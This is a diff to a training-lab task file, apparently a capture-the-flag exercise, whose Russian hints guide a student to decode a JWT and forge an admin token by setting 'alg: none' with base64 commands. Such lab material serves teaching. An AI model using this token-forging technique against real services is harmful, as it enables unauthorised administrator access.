@@ -21,6 +21,7 @@ lab:
   files: [task.md, token.txt]
   check: "grep -q 'nto{' found.txt"
   hints:
+    - "Повторение (`web-auth-jwt-idor`): сначала декодируй payload — `cut -d. -f2 token.txt | base64 -d`; выпиши `alg` и `role`."
     - Твой токен — в `token.txt`. Посмотри payload: `cut -d. -f2 token.txt | base64 -d`.
     - Сервер не проверяет подпись: подойдёт `alg: none`. Закодируй заголовок: `echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0`.
     - Закодируй payload с админской ролью: `echo -n '{"sub":"alice","role":"admin"}' | base64 -w0`.
